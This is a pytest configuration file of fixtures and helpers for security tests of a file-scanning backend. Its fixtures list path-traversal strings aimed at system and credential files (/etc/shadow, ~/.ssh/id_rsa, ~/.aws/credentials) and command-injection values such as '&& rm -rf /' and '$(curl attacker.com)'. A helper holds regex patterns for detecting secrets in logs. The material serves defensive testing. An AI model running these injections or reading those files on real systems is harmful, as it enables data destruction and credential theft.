"""
Pytest configuration and fixtures for security testing.

This module provides common fixtures and configuration for all security tests.
"""

import pytest
import tempfile
import os
import sys
from pathlib import Path
from typing import Generator

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

# ============================================================================
# Pytest Configuration
# ============================================================================

def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers",
        "security: Marks tests as security-critical tests"
    )
    config.addinivalue_line(
        "markers",
        "unit: Marks tests as unit tests"
    )
    config.addinivalue_line(
        "markers",
        "integration: Marks tests as integration tests"
    )
    config.addinivalue_line(
        "markers",
        "e2e: Marks tests as end-to-end tests"
    )
    config.addinivalue_line(
        "markers",
        "slow: Marks tests as slow-running tests"
    )
    config.addinivalue_line(
        "markers",
        "performance: Marks tests as performance benchmarks"
    )

# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """
    Provide a temporary directory for tests.

    Yields:
        Path to temporary directory
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def temp_db_path(temp_dir: Path) -> Path:
    """
    Provide a temporary database file path.

    Args:
        temp_dir: Temporary directory fixture

    Returns:
        Path to temporary database file
    """
    return temp_dir / "test.db"


@pytest.fixture
def sample_scan_data() -> dict:
    """
    Provide sample scan data for testing.

    Returns:
        Dictionary with sample scan data
    """
    return {
        "scan_id": "test-scan-123",
        "root_path": "/tmp/test_scan",
        "started_at": "2025-03-09T10:00:00",
        "completed_at": "2025-03-09T10:05:00",
        "total_files": 150,
        "total_folders": 25,
        "total_size_bytes": 1073741824,  # 1GB
    }


@pytest.fixture
def malicious_paths() -> list:
    """
    Provide list of malicious path traversal attempts.

    Returns:
        List of malicious paths to test against
    """
    return [
        "../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
        "./../../../../../../etc/passwd",
        ".../....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",  # URL encoded
        "..%252f..%252f..%252fetc%2fpasswd",  # Double encoded
        "/../../../../../../../../etc/passwd",
        "..\\\\..\\\\..\\\\..\\\\windows\\\\system32",
        "~/.ssh/id_rsa",
        "~/.aws/credentials",
        "/proc/self/environ",
        "C:\\Users\\test\\..\\..\\Windows\\System32",
        "/var/lib/mysql/mysql.sock",
        "C:\\Program Files\\..\\Windows\\System32",
    ]


@pytest.fixture
def invalid_inputs() -> dict:
    """
    Provide invalid input samples for testing.

    Returns:
        Dictionary with categorized invalid inputs
    """
    return {
        "null_bytes": [
            "test\x00.txt",
            "scan\x00path",
            "\x00\x00\x00",
        ],
        "excessively_long": [
            "A" * 10000,
            "B" * 100000,
        ],
        "special_chars": [
            "$(whoami)",
            "`id`",
            "; cat /etc/passwd",
            "| ls -la",
            "&& rm -rf /",
            "$(curl attacker.com)",
        ],
        "unicode_attacks": [
            "\u202e" + "etc/passwd",  # Right-to-left override
            "\ufeff" + "scan",  # Zero-width no-break space
            "\u200b" * 100 + "test",  # Zero-width space
        ]
    }


@pytest.fixture
def mock_encryption_key() -> bytes:
    """
    Provide a mock encryption key for testing.

    Returns:
        32-byte encryption key
    """
    return b"0" * 32  # Simplified for testing


@pytest.fixture
def security_config() -> dict:
    """
    Provide security configuration for testing.

    Returns:
        Dictionary with security settings
    """
    return {
        "allowed_roots": ["/tmp", os.path.expanduser("~")],
        "max_path_length": 1000,
        "enable_encryption": True,
        "encryption_iterations": 100000,
        "log_redaction": True,
    }


# ============================================================================
# Test Helpers
# ============================================================================

def assert_path_blocked(path: str, error_type: type = Exception):
    """
    Assert that accessing a path is blocked.

    Args:
        path: The path that should be blocked
        error_type: Expected exception type

    Raises:
        AssertionError: If path is not blocked
    """
    import pytest
    with pytest.raises(error_type):
        from backend.security.path_validator import PathValidator
        validator = PathValidator(allowed_roots=["/tmp"])
        validator.validate(path)


def assert_log_redacted(log_message: str):
    """
    Assert that a log message has been properly redacted.

    Args:
        log_message: The log message to check

    Raises:
        AssertionError: If sensitive data found in log
    """
    import re

    # Check for common sensitive patterns
    sensitive_patterns = [
        r'[A-Z]:\\[^ ]+\\[^ ]+',  # Windows paths
        r'/[^ ]+/[^ ]+',  # Unix paths
        r'\.ssh',  # SSH directory
        r'\.aws',  # AWS directory
        r'password',  # Password references
        r'key',  # Key references
        r'token',  # Token references
    ]

    for pattern in sensitive_patterns:
        matches = re.findall(pattern, log_message, re.IGNORECASE)
        assert len(matches) == 0, f"Sensitive data found in log: {matches} in '{log_message}'"


def assert_no_external_calls(captured_requests):
    """
    Assert that no external network calls were made.

    Args:
        captured_requests: List of HTTP requests made during test

    Raises:
        AssertionError: If external calls detected
    """
    localhost_addresses = {
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0",
    }

    for request in captured_requests:
        url = request.get("url", "")
        assert not url, f"Unexpected HTTP request: {url}"

        # If URL present, check it's localhost
        from urllib.parse import urlparse
        parsed = urlparse(url)
        hostname = parsed.hostname or parsed.netloc

        assert hostname in localhost_addresses, \
            f"External call detected: {hostname} in {url}"


# ============================================================================
# Monkeypatch Fixtures
# ============================================================================

@pytest.fixture
def mock_file_system(monkeypatch, temp_dir: Path):
    """
    Mock file system operations for testing.

    Args:
        monkeypatch: Pytest monkeypatch fixture
        temp_dir: Temporary directory fixture

    Yields:
        None
    """
    # Mock os.path.exists to only allow temp_dir
    def mock_exists(path):
        path_obj = Path(path).resolve()
        temp_resolved = temp_dir.resolve()
        return path_obj.is_relative_to(temp_resolved)

    monkeypatch.setattr("os.path.exists", mock_exists)
    monkeypatch.setattr("pathlib.Path.exists", lambda self: mock_exists(self))

    # Mock os.listdir to only show temp_dir contents
    def mock_listdir(path):
        path_obj = Path(path).resolve()
        temp_resolved = temp_dir.resolve()
        if path_obj.is_relative_to(temp_resolved):
            return list(path_obj.iterdir())
        return []

    monkeypatch.setattr("os.listdir", mock_listdir)

    yield


@pytest.fixture
def mock_crypto(monkeypatch):
    """
    Mock cryptographic operations for testing.

    Args:
        monkeypatch: Pytest monkeypatch fixture

    Yields:
        None
    """
    # Use fast KDF for testing (NOT for production)
    monkeypatch.setattr(
        "backend.security.encryption.PBKDF2_ITERATIONS",
        1000,  # Much faster for tests
        raising=False
    )

    yield


# ============================================================================
# Performance Fixtures
# ============================================================================

@pytest.fixture
def performance_threshold() -> dict:
    """
    Provide performance thresholds for security operations.

    Returns:
        Dictionary with threshold values in seconds
    """
    return {
        "encryption_overhead": 0.1,  # 100ms
        "path_validation": 0.001,  # 1ms
        "input_sanitization": 0.001,  # 1ms
        "log_redaction": 0.001,  # 1ms
    }


@pytest.fixture
def benchmark_logger():
    """
    Provide a logger for benchmarking security operations.

    Returns:
        Logger instance
    """
    import logging
    logger = logging.getLogger("security.benchmark")
    logger.setLevel(logging.INFO)
    return logger


# ============================================================================
# Coverage Configuration
# ============================================================================

@pytest.fixture(autouse=True)
def coverage_config():
    """
    Automatically apply coverage configuration.

    This fixture runs automatically for all tests.
    """
    # Ensure coverage is enabled
    if os.environ.get("COVERAGE_RUN"):
        import coverage
        cov = coverage.Coverage()
        cov.start()

        yield

        cov.stop()
        cov.save()
    else:
        yield
